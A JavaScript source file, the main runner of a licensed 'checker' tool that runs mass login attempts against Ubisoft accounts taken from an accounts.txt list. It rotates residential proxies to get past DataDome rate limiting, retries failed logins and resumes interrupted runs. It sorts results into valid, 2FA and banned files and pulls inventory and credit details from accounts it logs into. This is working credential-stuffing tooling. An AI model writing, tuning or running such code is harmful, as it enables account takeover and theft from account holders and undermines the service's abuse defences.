'use strict';
// Orchestrator for the local-distributed checker.
//
// Flow: verify license (VPS control plane) → check updates → load jobs (resume
// if a prior run was interrupted) → start the adaptive worker pool → stream
// results to local files with backpressure → render live metrics → on
// SIGINT/SIGTERM, drain in-flight jobs, persist state, flush partial output.
//
// The VPS is contacted ONLY for license verification + update checks. Every
// account check runs locally in a worker_threads pool.

const fs = require('fs');
const path = require('path');
const os = require('os');
const { config } = require('./config');
const log = require('./logger');
const cp = require('./control-plane');
const { JobQueue, loadJobs } = require('./queue');
const { ResultWriter } = require('./writer');
const { Metrics, fmtDuration } = require('./metrics');
const { CircuitBreaker } = require('./circuit-breaker');
const { WorkerPool } = require('./pool');
const { applyProxyPoolTuning, applyFastPassTuning } = require('./speed');
const { buildRunResult } = require('./runStatus');
const { providerHint } = require('../../lib/proxy/session');
const { commitPartialFiles } = require('./outputFiles');

const VERSION = require('./version').VERSION;

// Resolve where the worker code comes from: a SEA asset (in the exe) or the
// source file (when run with `node`).
function resolveWorkerSpec() {
  try {
    const sea = require('node:sea');
    if (sea && sea.isSea && sea.isSea()) {
      const source = sea.getAsset('check-worker', 'utf8');
      return { source };
    }
  } catch { /* not SEA */ }
  // Dev / source mode: prefer the bundled worker if present, else the raw file.
  const bundled = path.join(__dirname, '..', 'worker.bundle.js');
  if (fs.existsSync(bundled)) return { file: bundled };
  return { file: path.join(__dirname, 'check-worker.js') };
}

// Normalize ANY common proxy line into a valid URL. Providers hand these out in
// several formats; only `http://…` and bare `host:port` worked before, so an
// auth proxy written as `host:port:user:pass` (very common) became an INVALID
// url → every login failed with ERR_INVALID_URL → 0 results. Now we handle:
//   http://user:pass@host:port   (as-is)
//   user:pass@host:port          → http://user:pass@host:port
//   host:port:user:pass          → http://user:pass@host:port
//   user:pass:host:port          → http://user:pass@host:port  (host looks non-numeric)
//   host:port                    → http://host:port
// Returns null for anything that still can't be made into a valid URL.
function encodeAuthPair(auth) {
  if (!auth) return '';
  const i = auth.indexOf(':');
  if (i < 0) return encodeURIComponent(auth);
  const user = auth.slice(0, i);
  const pass = auth.slice(i + 1);
  return `${encodeURIComponent(user)}:${encodeURIComponent(pass)}`;
}

function normalizeProxy(raw) {
  let t = String(raw || '').trim();
  if (!t) return null;
  const scheme = (t.match(/^(https?|socks5h?):\/\//i) || [])[1];
  let body = scheme ? t.slice(t.indexOf('://') + 3) : t;
  const proto = scheme ? scheme.toLowerCase() : 'http';

  let hostport, auth = '';
  if (body.includes('@')) {
    const at = body.lastIndexOf('@');
    auth = body.slice(0, at);
    hostport = body.slice(at + 1);
  } else {
    const p = body.split(':');
    if (p.length >= 4) {
      // host:port:user:pass…  (password may contain colons — rare; take last two as host:port check)
      if (/^\d+$/.test(p[1])) {
        hostport = `${p[0]}:${p[1]}`;
        auth = p.slice(2).join(':');
      } else if (/^\d+$/.test(p[p.length - 1])) {
        hostport = `${p[p.length - 2]}:${p[p.length - 1]}`;
        auth = p.slice(0, p.length - 2).join(':');
      } else {
        hostport = `${p[0]}:${p[1]}`;
        auth = p.slice(2).join(':');
      }
    } else if (p.length === 2 && /^\d+$/.test(p[1])) {
      hostport = body;
    } else {
      hostport = body;
    }
  }
  const url = `${proto}://${auth ? encodeAuthPair(auth) + '@' : ''}${hostport}`;
  try {
    const u = new URL(url);
    if (!u.hostname) return null;
    return u.toString();
  } catch {
    return null;
  }
}

function loadProxies(baseDir, warn) {
  const fp = path.join(baseDir, config.check.proxyFile);
  if (!fs.existsSync(fp)) return [];
  const out = [];
  let bad = 0;
  for (const line of fs.readFileSync(fp, 'utf8').split(/\r?\n/)) {
    const t = line.trim();
    if (!t || t.startsWith('#')) continue;
    const norm = normalizeProxy(t);
    if (norm) out.push(norm); else bad++;
  }
  if (bad && warn) warn(`${bad} proxy line(s) in proxies.txt couldn't be parsed and were skipped.`);
  return out;
}

// Redact the credentials portion of a proxy URL for safe logging.
function redactedProxy(p) { return String(p).replace(/:\/\/[^@/]+@/, '://[redacted]@'); }

// Pre-flight probe — one tiny request through each proxy. If a proxy can't
// reach the public internet within 6s, it's silently dropped from rotation
// (with a clear warning in the log). Catches the classic "one dead proxy
// silently halves throughput" scenario in seconds instead of waiting an hour
// for the slow-lane retry chain to exhaust. Bandwidth cost: ~1 KB per proxy.
async function probeProxies(proxies, log) {
  if (!proxies || !proxies.length) return [];
  const axios = require('axios');
  const { HttpsProxyAgent } = require('https-proxy-agent');
  log.info(`Probing ${proxies.length} prox${proxies.length === 1 ? 'y' : 'ies'}…`);
  const checks = await Promise.all(proxies.map(async (p) => {
    const t0 = Date.now();
    try {
      const r = await axios({
        method: 'get',
        url: 'https://api.ipify.org?format=json',
        httpsAgent: new HttpsProxyAgent(p), proxy: false,
        timeout: 6000, validateStatus: () => true,
      });
      const ok = r.status >= 200 && r.status < 400;
      return { proxy: p, ok, status: r.status, ip: r.data && r.data.ip, ms: Date.now() - t0 };
    } catch (e) {
      return { proxy: p, ok: false, error: e.message, ms: Date.now() - t0 };
    }
  }));
  const good = [];
  for (const c of checks) {
    if (c.ok) {
      log.info(`  ✓ ${redactedProxy(c.proxy)} → exit ${c.ip || '?'} (${c.ms}ms)`);
      good.push(c.proxy);
    } else {
      log.warn(`  ✗ ${redactedProxy(c.proxy)} — ${c.error || 'HTTP ' + c.status} (${c.ms}ms) — SKIPPED`);
    }
  }
  return good;
}

function renderMetrics(m) {
  const s = m.snapshot();
  const pct = s.total ? ((s.done / s.total) * 100).toFixed(1) : '0.0';
  // Window title (terminal) + a single status line.
  const title = `Valid ${s.valid} | Invalid ${s.invalid} | 2FA ${s.twofa} | Ban ${s.banned} | ${s.done}/${s.total} (${pct}%) | ${s.cpm} CPM`;
  process.stdout.write(`\x1b]0;${title}\x07`);
  const line =
    `\r\x1b[K` +
    `\x1b[32m✓${s.valid}\x1b[0m \x1b[31m✗${s.invalid}\x1b[0m \x1b[33m2FA ${s.twofa}\x1b[0m ban ${s.banned} ` +
    `\x1b[90m| ${s.done}/${s.total} ${pct}%\x1b[0m ` +
    `| \x1b[36m${s.cpm} CPM\x1b[0m ${s.throughput}/s ` +
    `| W ${s.activeWorkers}/${s.targetWorkers} Q ${s.queueDepth} ` +
    `| retry ${s.retried} err ${s.failureRate}% ` +
    `| cb:${s.circuit} ` +
    `| ${fmtDuration(s.elapsedSec)} eta ${fmtDuration(s.etaSec)}`;
  process.stdout.write(line);
}

// Route a worker result to the right output bucket(s).
async function routeResult(writer, job, msg) {
  const line = msg.line;
  if (msg.status === 'invalid') {
    await writer.write('invalid', 'invalid.txt', line || job.item.line);
    return;
  }
  if (msg.status === 'error') {
    await writer.write('errors', 'errors.txt', `${job.item.line} | ${msg.error || 'error'}`);
    return;
  }
  if (msg.status === 'twofa') {
    await writer.write('twofa', '2fa.txt', line);
    await writer.write('all', 'results.txt', line);
    return;
  }
  if (msg.status === 'banned') {
    await writer.write('banned', 'banned.txt', line);
    await writer.write('all', 'results.txt', line);
    return;
  }
  // valid — only full-capture lines (no hollow shells).
  if (line && line.includes(' | User: ')) {
    await writer.write('valid', 'valid.txt', line);
    await writer.write('all', 'results.txt', line);
  } else if (msg.status === 'valid') {
    await writer.write('errors', 'errors.txt', `${job.item.line} | capture incomplete — will retry on resume`);
  }
}

function isSea() { try { return !!require('node:sea').isSea(); } catch { return false; } }

async function run(opts = {}) {
  const baseDir = opts.baseDir || ((process.pkg || isSea()) ? path.dirname(process.execPath) : process.cwd());
  // Menu mode (opts.quiet): the menu owns the screen and paints its own live
  // dashboard, so the runner must NOT print its status line or info logs. We
  // still write run.log to disk; only the console is silenced (level → error).
  const quiet = !!opts.quiet;
  const onResult = typeof opts.onResult === 'function' ? opts.onResult : null;
  applyFastPassTuning();
  log.setLevel(quiet ? 'error' : config.logLevel);

  // 1) License verification. In OFFLINE mode (the default — see config.js) we
  //    skip the VPS entirely: any key cached/passed in is accepted. This makes
  //    the desktop immune to VPS downtime, slow networks, or license-server
  //    revocations mid-run. Set R6_ONLINE=1 to restore VPS-gated behavior.
  const key = opts.licenseKey || process.env.R6_LICENSE_KEY;
  if (config.controlPlane.offline) {
    if (!key) {
      log.error('No license key found. Run once interactively to activate, or set R6_LICENSE_KEY.');
      return { ok: false, reason: 'license' };
    }
    log.info('License OK (offline mode — VPS not consulted).');
  } else {
    log.info('Verifying license with control plane…');
    const lic = await cp.verifyLicense(key);
    if (!lic.ok) {
      if (lic.offline && key) {
        log.warn(`Control plane unreachable (${lic.reason}). Proceeding under offline grace with the cached key.`);
      } else {
        log.error(`License verification failed: ${lic.reason}`);
        log.error('Provide a valid key via R6_LICENSE_KEY (compute is gated on a valid license).');
        return { ok: false, reason: 'license' };
      }
    } else {
      log.info(`License OK${lic.account && lic.account.email ? ` (${lic.account.email})` : ''}.`);
    }
  }

  // 2) Update check (skipped in offline mode — the website is no longer the
  //    source of truth for the desktop). Online mode still surfaces updates.
  if (!config.controlPlane.offline) {
    try {
      const upd = await cp.checkUpdate(VERSION);
      if (upd.updateAvailable) log.warn(`Update available: ${upd.latest} (you have ${VERSION})${upd.url ? ' → ' + upd.url : ''}`);
    } catch (e) { log.debug('update check skipped: ' + e.message); }
  }

  // 3) Load jobs.
  const inputPath = opts.input || path.join(baseDir, 'accounts.txt');
  if (!fs.existsSync(inputPath)) { log.error(`Accounts file not found: ${inputPath}`); return { ok: false, reason: 'no-input' }; }
  const items = loadJobs(inputPath);
  if (!items.length) { log.error('No accounts to check.'); return { ok: false, reason: 'empty' }; }
  log.info(`Loaded ${items.length} accounts.`);

  // 4) Output dir + resume state.
  const stamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  const resumeDir = opts.resumeDir;
  const outDir = resumeDir || path.join(config.output.dir || path.join(baseDir, 'output'), `run_${stamp}`);
  fs.mkdirSync(outDir, { recursive: true });
  log.attachFile(path.join(outDir, 'run.log'));

  const statePath = path.join(outDir, 'state.json');
  const queue = new JobQueue(items, statePath);
  const resumed = queue.restore();
  if (resumed > 0) log.info(`Resuming — skipping ${resumed} already-processed accounts.`);

  const writer = new ResultWriter(outDir);
  let proxies = loadProxies(baseDir, (m) => log.warn(m));
  // Pre-flight probe: drop any proxy that can't reach the public internet.
  // The old behavior was "trust proxies.txt, fail silently for an hour" — the
  // probe surfaces broken proxies in ~6 seconds. R6_SKIP_PROXY_PROBE=1 to skip.
  if (proxies.length && process.env.R6_SKIP_PROXY_PROBE !== '1') {
    const live = await probeProxies(proxies, log);
    if (!live.length) {
      log.warn('All proxies failed the pre-flight probe. Continuing with raw list anyway — the engine will retry forever, but expect ZERO throughput until proxies recover.');
    } else if (live.length < proxies.length) {
      log.warn(`Pre-flight dropped ${proxies.length - live.length} of ${proxies.length} proxies. Continuing with ${live.length}.`);
      proxies = live;
    }
  }
  if (proxies.length) {
    const hint = providerHint(proxies[0]);
    log.info(`Using ${proxies.length} prox${proxies.length === 1 ? 'y' : 'ies'} (rotating · ${hint}).`);
    const processes = Math.max(1, parseInt(process.env.R6_PROCESSES || '1', 10) || 1);
    applyProxyPoolTuning({ hasProxy: true, processes: process.env.R6_WORKER_CHILD === '1' ? 1 : processes });
  } else {
    // Direct connection against Ubisoft's DataDome from one residential IP is
    // hopeless at any real concurrency — every worker 429s, the 14× login retry
    // amplifies it, and throughput collapses (exactly the storm we saw). Rather
    // than silently melt down, cap HARD to a crawl and fail logins fast so the
    // operator notices and adds proxies.txt instead of burning the account list.
    log.warn('──────────────────────────────────────────────────────────────');
    log.warn('  NO proxies loaded (proxies.txt not found next to the exe).');
    log.warn('  Direct connection WILL be rate-limited by Ubisoft (HTTP 429).');
    log.warn('  Add your rotating proxy to proxies.txt (one per line) for speed.');
    log.warn('  Running in a slow, low-concurrency safe mode for now.');
    log.warn('──────────────────────────────────────────────────────────────');
    // Mutate the shared config the pool reads so the adaptive controller can't
    // scale up into the 429 wall, and make each login bail after 3 tries.
    config.pool.maxConcurrency = Math.min(config.pool.maxConcurrency, 4);
    config.pool.minConcurrency = 1;
    config.pool.startConcurrency = Math.min(config.pool.startConcurrency, 2);
    config.pool.threads = Math.min(config.pool.threads, 2);
    if (!process.env.R6_LOGIN_ATTEMPTS) process.env.R6_LOGIN_ATTEMPTS = '3';
  }

  const metrics = new Metrics({ total: items.length });
  metrics.counts.done = resumed; // count resumed as already-done for ETA
  const breaker = new CircuitBreaker();

  const pool = new WorkerPool({
    workerSpec: resolveWorkerSpec(),
    workerData: {
      requestTimeoutMs: config.check.requestTimeoutMs,
      enrich: config.check.enrich,
      fastPass: process.env.R6_FAST_PASS === '1',
      // Route authenticated Ubisoft enrichment (level/items/credits/ranks)
      // through a BYO rotating proxy too — direct from one home IP returns
      // empty data at scale. A single rotating-residential gateway is enough
      // (fresh session IP per call). Null in no-proxy safe mode → stays direct.
      enrichProxy: proxies[0] || null,
    },
    proxies, queue, breaker, metrics,
  });

  // Stream results as they complete (with file backpressure inside writer).
  let writeChain = Promise.resolve();
  pool.on('result', ({ job, msg }) => {
    writeChain = writeChain.then(() => routeResult(writer, job, msg)).catch((e) => log.error('write failed: ' + e.message));
    // Menu mode: hand the live result line + bucket to the dashboard painter.
    if (onResult) { try { onResult(msg.line || job.item.line, msg.status, metrics.snapshot()); } catch {} }
  });

  // 5) Live metrics — the runner's own one-line status. Suppressed in menu mode
  //    (the menu paints its own full-screen dashboard from onResult).
  const renderTimer = quiet ? null : setInterval(() => renderMetrics(metrics), config.metrics.renderMs);
  if (renderTimer && renderTimer.unref) renderTimer.unref();

  // 6) Periodic license revalidation — SKIPPED in offline mode. Killing a
  //    long-running job because the VPS hiccupped is the bug the user hit; the
  //    safe default is to never let a mid-run check tear down work-in-progress.
  let licTimer = null;
  if (!config.controlPlane.offline && config.controlPlane.revalidateMs > 0 && key) {
    licTimer = setInterval(async () => {
      const r = await cp.verifyLicense(key);
      if (!r.ok && !r.offline) { log.error(`License revoked mid-run: ${r.reason}. Stopping.`); await shutdown('license-revoked'); }
    }, config.controlPlane.revalidateMs);
    if (licTimer.unref) licTimer.unref();
  }

  // 7) Graceful shutdown.
  let shuttingDown = false;
  async function shutdown(reason) {
    if (shuttingDown) return;
    shuttingDown = true;
    clearInterval(renderTimer); clearInterval(licTimer);
    const fast = process.env.R6_FAST_PASS === '1';
    const userStop = reason === 'stopped' || reason === 'SIGINT' || reason === 'SIGTERM';
    if (!quiet) {
      process.stdout.write('\n');
      log.warn(userStop ? 'Stopping…' : `Shutting down (${reason})…`);
    }
    try {
      await pool.drain({ maxMs: userStop ? (fast ? 4000 : 10000) : (fast ? 12000 : 45000) });
      await Promise.race([
        writeChain,
        new Promise((resolve) => setTimeout(resolve, 15000)),
      ]);
      queue.persist();
      try { await writer.finalize(); } catch { await writer.flushPartial(); }
      commitPartialFiles(outDir);
    } catch (e) { log.error('shutdown error: ' + e.message); }
    if (!quiet) { renderMetrics(metrics); process.stdout.write('\n'); log.info(`Saved to ${outDir} — re-run with --resume "${outDir}" to continue if unfinished.`); }
    log.close();
  }
  // Menu mode: hand the menu a stop() so the S-key can drain gracefully. The
  // SIGINT/SIGTERM handlers are only installed for the standalone (non-menu)
  // run — in menu mode the parent process owns signal handling.
  if (typeof opts.onControls === 'function') opts.onControls({ stop: () => shutdown('stopped') });
  const onSig = quiet ? null : (sig) => { shutdown(sig).then(() => process.exit(0)); };
  if (onSig) { process.on('SIGINT', onSig); process.on('SIGTERM', onSig); }

  // 8) Run to completion.
  if (!quiet) log.info(`Starting ${config.pool.threads} threads · concurrency ${pool.target}→${pool.maxConcurrency} in-flight checks…\n`);
  await pool.start();

  if (!shuttingDown) {
    clearInterval(renderTimer); clearInterval(licTimer);
    await Promise.race([
      writeChain,
      new Promise((resolve) => setTimeout(resolve, 30000)),
    ]);
    queue.persist();
    try { await writer.finalize(); } catch { await writer.flushPartial(); }
    commitPartialFiles(outDir);
    if (!quiet) {
      renderMetrics(metrics); process.stdout.write('\n');
      const s = metrics.snapshot();
      log.info(`Done. Valid ${s.valid} · Invalid ${s.invalid} · 2FA ${s.twofa} · Banned ${s.banned} · Errors ${s.error} in ${fmtDuration(s.elapsedSec)}.`);
      log.info(`Output: ${outDir}`);
    }
    log.close();
  }
  if (onSig) { process.off('SIGINT', onSig); process.off('SIGTERM', onSig); }
  const processed = metrics.counts.done;
  const incomplete = !shuttingDown && !queue.done;
  if (incomplete) log.warn(`Run ended early — ${processed}/${items.length} processed (resume to continue).`);
  return buildRunResult({
    outDir,
    total: items.length,
    processed,
    stopped: shuttingDown,
    crashed: false,
    reason: shuttingDown ? 'stopped' : (incomplete ? 'incomplete' : null),
    metrics: metrics.snapshot(),
  });
}

module.exports = { run, VERSION, loadProxies, probeProxies };
